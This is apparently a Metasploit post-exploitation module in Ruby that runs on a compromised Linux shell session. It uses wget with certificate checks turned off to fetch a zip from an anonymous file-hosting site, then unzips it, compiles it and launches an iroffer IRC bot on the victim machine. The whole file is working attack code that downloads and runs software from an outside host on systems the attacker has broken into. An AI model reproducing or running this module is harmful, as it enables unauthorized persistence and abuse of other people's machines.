#
# download, compile, and install iroffer 
#
#

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/system'
require 'msf/core/post/linux/priv'

class Metasploit3 < Msf::Post

    include Msf::Post::Common
    include Msf::Post::File
    include Msf::Post::Linux::System

    def initialize(info={})
        super( update_info( info,
                'Name'          => 'Install Iroffer bot on target',
                'Description'   => %q{
                    This module downloads, compiles and installs an iroffer bot on the target machine.},
                'License'       => MSF_LICENSE,
                'Author'        => [ 'Doug Prostko <dougtko[at]gmail.com>' ],
                'Platform'      => [ 'linux' ],
                'SessionTypes'  => [ 'shell' ]
            ))
    end

    def run
        distro = get_sysinfo
        h = get_host
        print_status("Running module against #{h}")
        #print_status("Info:")
        #print_status("\t#{distro[:version]}")
        #print_status("\t#{distro[:kernel]}")
        #print_status("PWD:\t#{pwd}")
        print_status("Setting PATH")
        cmd_exec("export PATH=/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin")
        download_files
        unzip_files
        cd("iroffer-dinoex")
        compile_source
        run_bot
    end

    def get_host
        case session.type
        when /meterpreter/
            host = sysinfo["Computer"]
        when /shell/
            host = session.shell_command_token("hostname").chomp
        end
        return host
    end

    def download_files
        print_status("Downloading iroffer source code")
        cmd_exec("wget --no-check-certificate https://cdn.anonfiles.com/1361987260657.zip")
        if(file?("1361987260657.zip"))
           print_good("File downloaded successfully")
        else
            print_error("Download failed")
            exit
        end
    end

    def unzip_files
        print_status("Unzipping archive")
        cmd_exec("unzip 1361987260657.zip")
        if(directory?("iroffer-dinoex"))
           print_good("Zip extraction succeeded")
        else
            print_error("Unzip failed")
            exit
        end
    end

    def compile_source
        print_status("Configuring and compiling")
        cmd_exec("./Configure")
        cmd_exec("make")
        if(file?("iroffer"))
            print_good("Compilation success!")
        else
            print_error("Compilation failed")
            exit
        end
    end

    def run_bot
        print_status("Running bot")
        print_status(cmd_exec("./iroffer -b foo.conf"))
    end
end
